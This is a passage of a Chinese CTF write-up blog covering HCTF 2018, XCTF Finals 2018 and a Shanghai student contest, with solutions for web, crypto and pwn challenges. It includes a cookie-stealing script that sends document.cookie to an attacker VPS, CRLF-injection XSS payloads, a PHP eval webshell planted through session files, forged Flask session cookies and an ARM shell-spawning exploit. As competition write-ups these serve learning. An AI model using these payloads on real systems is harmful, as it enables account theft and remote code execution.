&quot;.eJw9kE2LgzAQhv_KMmcPGk1dCz0U1OJCpghxQ3KR1I31K13QFqml_31tD3t8n_dhmJkHlPVopga21_FmHCjbH9g-4OMEW0CuOuTFXRLmYtxTZVWv-GBRYI-WzYrvKePVLEkeyKXyVTy0SLBXIid4yGf2cklBUXz37JAEuKy-zWYUhS9XpkRyZzZtMd4HyqYNi9HKRVJJMh8X1WL3teacIkmbI5cB49mihGqkTahc0uEYY8fEi7MdPB2oprEur7-9uazLU127rh96mhovCmu3DrWvK2PCz4hEG6IranRUVxtwoLX6bP6v5glmMt-9J160XQs422HVbpMZ3-8Bz4XnH8pzYho.W-pkDw.8VHOyWfjrgVGMKOpjxyK3Q4UPq4&quot; -s &quot;ckj123&quot;</span><br><span class="line">&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;56c552cc4499ffde9f5cd6c0e09170cd8c77d9b7cded64d019f7e95ed0a87092b05e7aedea22ab408faa03fc69cb776b62fc497aa968123efaba9c1e83c1f813&apos;, &apos;csrf_token&apos;: &apos;5af00371a5e197f0f7a3acee7892962ac5ea9fc6&apos;, &apos;image&apos;: b&apos;LCHa&apos;, &apos;name&apos;: &apos;gml&apos;, &apos;user_id&apos;: &apos;10&apos;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -3 session_cookie_manager.py encode -t &quot;&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;56c552cc4499ffde9f5cd6c0e09170cd8c77d9b7cded64d019f7e95ed0a87092b05e7aedea22ab408faa03fc69cb776b62fc497aa968123efaba9c1e83c1f813&apos;, &apos;csrf_token&apos;: &apos;5af00371a5e197f0f7a3acee7892962ac5ea9fc6&apos;, &apos;image&apos;: b&apos;LCHa&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;&#125;&quot; -s &quot;ckj123&quot;</span><br><span class="line">.eJw9kE2LgzAQhv_KMmcPGk1dhR4KanEhU4R0Q3KR1Mb1Ky7YFqml_31tD3t8n_dhmJkHlPVkLg3E1-lmHCjbM8QP-DhBDMhVh_x4l4S5mPRUWdUrPlgU2KNls-I7yng1S1IEcql8lQwtEuyVKAjui5m9XHKkKL57tk8DXFbf5jOKoy9XpkR6ZzZrMdkFymYNS9DKRVJJch8X1WL3teaCIsmaA5cB4_mihGqkTalcsuGQYMfEi7MtPB2oLlNdXn97M67LU127rh96mhovCmu3DrWvK2PCz4hEG6IranRUVxtwoLX6x_xfzVPMZbF9Txy1XQvQZ9uOq3i7mOn9IPBceP4Bk15i4w.W-pzdQ.PJAuINlsKAVYWnmZLp7QUJFIiNI</span><br></pre></td></tr></table></figure><p>然后带着 session 去访问 <a href="http://admin.2018.hctf.io/index" target="_blank" rel="noopener">http://admin.2018.hctf.io/index</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-55bfbfaac1c37ecb.png" alt="image.png"></p><h5 id="本地生成"><a href="#本地生成" class="headerlink" title="本地生成"></a>本地生成</h5><p>本地搭环境登录 admin 获取 session。</p><h4 id="解法三、条件竞争"><a href="#解法三、条件竞争" class="headerlink" title="解法三、条件竞争"></a>解法三、条件竞争</h4><p>这个有师傅利用条件竞争成功登入 admin 的，见这篇：</p><p><a href="https://gist.github.com/dotsu123/7e479ad93c62c9632a97dbb9bb119681" target="_blank" rel="noopener">https://gist.github.com/dotsu123/7e479ad93c62c9632a97dbb9bb119681</a></p><p>不过我没有复现成功。。。</p><h4 id="解法四、莫名其妙拿-flag"><a href="#解法四、莫名其妙拿-flag" class="headerlink" title="解法四、莫名其妙拿 flag"></a>解法四、莫名其妙拿 flag</h4><p>听天枢的师傅说这个题有个奇怪的 bug… 天枢 wp 的链接 <a href="https://xz.aliyun.com/t/3256#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3256#toc-4</a></p><p>这题这么多解法真是可以2333。</p><h3 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h3><p>登进去是下面的页面：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a780dd32f0ef065b.png" alt="image.png"></p><p>很像是 xss，发现有个 302 跳转：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-120a29c797c2b375.png" alt="image.png"></p><p>参考 p神的文章：<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p><p>使用 &lt;80 的端口绕过 302。直接打 cookie，用 VPS 和 xss 平台都可以。</p><p>验证码可以用下面脚本跑出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">1000000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(substr(md5($i),<span class="number">0</span>,<span class="number">4</span>) == <span class="string">"95fa"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>VPS</strong>：</p><p>在我的 VPS 上放个 cookie.js，内容为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keep=<span class="keyword">new</span> Image(); keep.src=<span class="string">'http://vps_address:2333?cookie='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure><p>然后在题目 url 填入下面 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0a%0d%0a%3Cscript%20src=http://vps/cookie.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure><p>验证码爆破，然后提交，在 vps 上监听 2333端口：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6fdc5501f03ed049.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d7ac91566e24bcdb.png" alt="image.png"></p><p>用打来的 cookie: <code>410e34187a19486dbdd6532fbb44af70</code> 访问：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-e9721c0ed7910c2e.png" alt="image.png"></p><p>用 <strong>xss</strong> 平台：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0a%0d%0a%3Cscript%20src=https://xss.pt/WqMR%3E%3C/script%3E</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-b6d0783047f0c4d1.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xor-game"><a href="#xor-game" class="headerlink" title="xor_game"></a>xor_game</h3><p>典型的重复密钥异或，之前 Bside 做过一个类似的，这次也是套用上次的思路。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>我们先假设 key 有10位，那么明文第 1 位与密文第 1 位异或的结果一定等于明文第11位与密文第11位异或的结果，因为结果就是 key 的第一个字符</p><p>所以我们可以控制明文的第 1 位和第 11 位进行爆破，当他们与各自位置的密文异或的结果相等，就说明异或的结果是 key 第一位的一个<strong>可能值</strong>。利用第一位和第十一位，应该会得到不止一个 key 第一位的可能值。再同理爆 11 位和 21 位，第 21 位 和第 22 位 ……最后各个组的可能值取交集，就有<strong>很大可能</strong>是 key 的第一位。</p><p>当然我们不知道 key 的位数，我们可以采用爆破的方法，看爆出的 key 哪个像是 flag，因为 flag 是可见字符并且可以辨认。</p><p>因为我们有足够多的组，所以有很小几率取交集剩下有多个字符，但是这里涉及到一个很棘手的问题，就是爆破明文的时候，爆破的字典选取。</p><p>这个字典，如果选择所有可见字符，那么确实每一位最后都会爆出很多个结果… 这道题说明文是一首诗，所以我能想到的字符集是<code>大小写字母+数字+空格、换行+标点符号</code>。这个字典选取如果过大，会爆出很多结果；如果字典选取过小，明文中有些字符没有在字典中，那么就会出现部分 key 的位数爆不出来的情况。</p><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>在做这个题时，我先<strong>尽量压低</strong>了字典的大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict=string.ascii_letters+string.digits+<span class="string">".?!'\",;: "</span>+chr(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">dict=string.ascii_letters+string.digits+<span class="string">".?!'\",;: "</span>+chr(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cipher.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher=base64.b64decode(f.read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    key = (key * (len(data) / len(key) + <span class="number">1</span>))[:len(data)]</span><br><span class="line">    <span class="keyword">return</span> strxor(data, key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">(i,j)</span>:</span></span><br><span class="line">    list=[]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dict:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">if</span> ord(a) ^ ord(cipher[i]) == ord(b) ^ ord(cipher[j]) :</span><br><span class="line">                list.append(chr(ord(a) ^ ord(cipher[i])))</span><br><span class="line">    <span class="keyword">return</span> set(list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    key_len = a</span><br><span class="line">    group = len(cipher) / key_len   <span class="comment">#组数</span></span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(key_len):</span><br><span class="line">        k = getkey(<span class="number">0</span> * key_len + i, <span class="number">1</span> * key_len + i)    <span class="comment">#第一组</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, group - <span class="number">1</span>):</span><br><span class="line">            k = k &amp; getkey(j * key_len + i, j * key_len + key_len + i)     <span class="comment">#每次取交集</span></span><br><span class="line">        key += <span class="string">''</span>.join(list(k))</span><br><span class="line">    <span class="keyword">print</span> key_len,<span class="string">":"</span>+key</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f1682c697ecb66e3.png" alt="image.png"></p><p>可以判断 key 应该为 21 位，而这个结果才 17 位，离真正的 key 还差一些。</p><p>很容易补齐前面差的 <code>x</code> 和后面的 <code>g</code>，但是还是差两两位，猜测字典可能小了，所以不断试着逐渐增大字典，终于最后找到了合适的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict=string.ascii_letters+string.digits+<span class="string">".?!'\",;: ()-"</span>+chr(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>最后跑出来 flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor_is_interesting!@#</span><br></pre></td></tr></table></figure><p>回顾我的思路，最大的问题是字典的选取。我在爆每一位的时候，取交集的组数是 <code>组数-1</code>，如果少用一些组，可能会降低字典选择的难度；又或者可以多用更多的组，比如第一组的第 1 位和其他各组都进行爆破，使用尽可能多的组进行取交集，让条件更为苛刻，那么就可以让字典大一些了，这些想法都可以试一试。</p><p>赛后看师傅们的思路，好像没有与我有类似思路的… 大体分为这两种：</p><ol><li>通过词频分析结合爆出的 key，一点点猜测真正的 key；</li><li>通过 <code>xortool</code>工具计算出模糊的 key，解密出明文的几个单词，然后去搜素发现是泰戈尔的《生如夏花》，还原出完完整整的一组明文，利用这 21 个字符的明文与密文异或得到 key。</li></ol><p>关于破解异或加密，贴上几个链接：</p><ol><li><a href="https://ehsandev.com/pico2014/cryptography/repeated_xor.html" target="_blank" rel="noopener">https://ehsandev.com/pico2014/cryptography/repeated_xor.html</a></li><li><a href="https://findneo.github.io/171005NuptVigenereWP/" target="_blank" rel="noopener">https://findneo.github.io/171005NuptVigenereWP/</a></li><li><a href="https://github.com/hellman/xortool" target="_blank" rel="noopener">https://github.com/hellman/xortool</a></li></ol><p>有兴趣的师傅可以深入研究。</p><h3 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor?rsa"></a>xor?rsa</h3><p>两段明文的前 <code>1024-40</code> 位相同，后 40 位不同，典型的 RSA padding short 攻击。</p><p>首先使用 <code>Coppersmith’s Short Pad Attack</code>  来获得两段明文的差值，然后再利用 <code>Related Message Attack</code>恢复明文，使用 sage 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   </span><br><span class="line">    n =</span><br><span class="line">    c1 =</span><br><span class="line">    c2 = </span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"difference of two messages is %d"</span> % diff</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">    <span class="keyword">print</span> m1</span><br><span class="line">    <span class="keyword">print</span> m1 + diff</span><br><span class="line">    <span class="keyword">assert</span>(pow(m1,e,n)==c1)</span><br><span class="line">    <span class="keyword">assert</span>(pow(m1 + diff,e,n)==c2)</span><br></pre></td></tr></table></figure><p>在<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a> 上运行，把结果发过去就可以得到 flag。</p><p>也可以采用下面的脚本求解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/FranklinReiter.sage</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 XCTF FINALS</title>
      <link href="/2018/11/05/2018-XCTF-FINALS/"/>
      <url>/2018/11/05/2018-XCTF-FINALS/</url>
      
        <content type="html"><![CDATA[<p>有幸参加了 2018 XCTF FINALS，线下长了不少见识。回学校就打了上海市大学生网络安全竞赛，现在记录一下 XCTF FINALS。</p><p>攻防赛四道 pwn，Web 狗也只能打打解题这样子…</p><p>解题有 5 道 Misc，2 道 Web 和 4 道 pwn，和队友做出了两道 Misc ，一道 Web 和两道 pwn。不得不说这次的 Misc 很新颖，加入了硬件的挑战，有两道题是通过给的路由器来拿 flag，还有核弹遥控器密码和无线频谱的题，自己太菜了，学不动…</p><a id="more"></a><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h4><p>这个题做的时候好像被人搅屎了，思路很清晰但是打不成功。。。后来找麦香师傅要了 docker，复现了一波就成了emmmmmm 有点可惜。</p><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:/tmp'</span>);</span><br><span class="line">    $file = <span class="string">'function.php'</span>;</span><br><span class="line">    $func = <span class="keyword">isset</span>($_GET[<span class="string">'function'</span>])?$_GET[<span class="string">'function'</span>]:<span class="string">'filters'</span>; </span><br><span class="line">    call_user_func($func,$_GET);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_POST[<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'name'</span>]==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        header(<span class="string">'location:admin.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限定了包含的目录，有回调函数可以执行函数，session 的内容可以通过 name 控制。</p><p>开始没有 get 到出题人的点，这种没有给任何 flag 信息的题应该就是 getshell了。开始一直纠结于回调函数第二个参数是数组如何利用，后来才知道这个题考点是<code>php7 + session 路径 + 变量覆盖</code> </p><p>name 可以控制 session 文件的内容，那么要把马写到 session 文件中去。然而 php 默认的 session 存储存储路径显然不在限定的<code>/var/www/html 和 /tmp</code> 中，我们无法包含，也就无法利用。</p><p>这里用到了 php7 的一个新特性，从 php7 开始，session_start 函数可以接收一个关联数组，可以覆盖 php.ini 文件中的默认配置，详细可见<a href="http://php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">官方文档</a> 。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-61b0a41e27b844f1.png" alt="image.png"></p><p>我们可以利用这个特点修改 session 的存放位置，payload:</p><p><code>?function=sesson_start&amp;save_path=/tmp</code></p><p>同时 post name 参数，把马写入 session 文件：</p><p><code>name=&lt;?php @eval($_POST[&#39;gml&#39;]);?&gt;</code></p><p>这样就把马写入了 session 文件里。（注意，php.ini 中设置 session 文件存储位置的变量是 session.save_path，payload 里不需要加 <code>session.</code> 加的话 . 也会被替换成 _，因为 php 规定变量名是不可以带 <code>.</code>  的，坑了我好久）</p><p>那么如何包含我们写的马呢？ 代码里有个 <code>include($file);</code> ，这里需要通过 extract 函数覆盖 file 变量，包含我们写的马，session 文件的命名为<code>sess_PHPSESSID</code> 所以通过下面的 payload 执行代码：</p><p><code>?function=extract&amp;file=/tmp/sess_bl0ur0r6ni8ioq5mqggr3sh5h5</code></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-04787bf7b76d4d90.png" alt="image.png"></p><p>发现执行命令成功：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-4c3c00d8e6e322c4.png" alt="image.png"></p><p>然后就是读 flag 了，拿蚁剑连一下：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-01782225a0d0feb8.png" alt="image.png"></p><h4 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h4><p>这道题是之前 2018 HITB GSEC FINAL 的 AWD 一道题的环境做了一些修改，当时我也去了现场，虽然没有打 AWD (打的解题)但是听了出题师傅 RicterZ 在新加坡国立大学的出题分享，照着差不多算是 wp 的 ppt 复现题目可还行…</p><p>这个题比较麻烦，源码泄露-&gt; ZEND解密 -&gt; sql 注入-&gt; 伪造 cookie 进管理员 -&gt; 控制 curl 的内容写 shell，具体可以参考 De1ta 的 Web 大师傅的 <a href="https://xz.aliyun.com/t/3158#toc-2" target="_blank" rel="noopener">wp</a></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Budge1"><a href="#Budge1" class="headerlink" title="Budge1"></a>Budge1</h4><p>Budge1 和 Budge2 是需要根据给的路由器拿 flag。</p><p>Budge1 相对简单，Budge2 是拿到管理员的 shell，登进去管理员页面看 flag，还要焊接的操作，只可惜当时做的时候没有硬件了。。。</p><p>Budge1 踩了坑，题目没给提示，还以为要抓包，连上网线分析了半天流量也没什么发现，然后出题人前面说 Budge1 是读灯的信息，才发现硬件有灯闪烁，应该是二进制的信息。两个灯可以闪烁，分别对应 0 和 1，连起来 hex 解码是 <code>hitb2018</code> ，然后怎么交也不对，提示说各种编码，hex 编码就过了…</p><h4 id="Mysterious-signals"><a href="#Mysterious-signals" class="headerlink" title="Mysterious signals"></a>Mysterious signals</h4><p>hint:无线射频频谱 radio frequency spectrum </p><p>使用 Audacity 导入数据（文件 -&gt; 导入 -&gt; 原始数据），查看频谱：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6be35f179f2c4d91.png" alt="image.png"></p><h3 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h3><p>见识了许多国内强队，Nu1lL 的师傅们就坐在对面… 还有 0ops，天枢等强队，r3kapig 的师傅们 tql。</p><p>Web 狗打不成攻防，肝了两天的解题，硬件的 Misc 题还是挺有趣的，第一天晚上回去肝核弹遥控器密码那个 Misc，只可惜没找到正确的工具分析，两天睡了 3 个多小时也是比较疲惫，不过酒店和队友一起肝的感觉也很好，有时候比赛结果并不是最重要的，重要的是有和你一起肝的兄弟们和朋友。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 上海市大学生网络安全大赛题解</title>
      <link href="/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>利用周末打了上海市大学生网络安全大赛，最后打了第三，这次的 Misc 真的是难上天，除了签到其他都做不动…膜一波复旦的师傅们。比赛中我打的是 Crypto 和部分 Web，这里也贴了一些队友的 wp。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>直接 base32 解码。</p><a id="more"></a><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h4><p> arm 架构，核心思想是改掉 mprotect 函数的参数，使 bss 段可执行。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'106.75.126.171'</span>, <span class="number">33865</span>)</span><br><span class="line"></span><br><span class="line">start = p64(<span class="number">0x4007D8</span>)+asm(shellcraft.aarch64.linux.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'Name:'</span>, start.ljust(<span class="number">512</span>, <span class="string">'\x00'</span>))</span><br><span class="line">padding=<span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">pop=<span class="number">0x4008CC</span></span><br><span class="line">lea=<span class="number">0x4008ac</span></span><br><span class="line">bss= <span class="number">0x411068</span></span><br><span class="line">payload = flat(padding, pop, <span class="number">0</span>, lea, <span class="number">0</span>, <span class="number">1</span>, bss, <span class="number">7</span>, <span class="number">0x1000</span>, <span class="number">0</span>, p64(<span class="number">0x411070</span>)*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="rsaaaaa"><a href="#rsaaaaa" class="headerlink" title="rsaaaaa"></a>rsaaaaa</h4><p>这道题有两个点，第一个点是 RSA 中给定 m 和 c，提供 d 和 n，这里脚本随机生成的公私钥，想要直接获取基本不可能，我们看到服务器脚本只判断了一个等式：</p><p><img 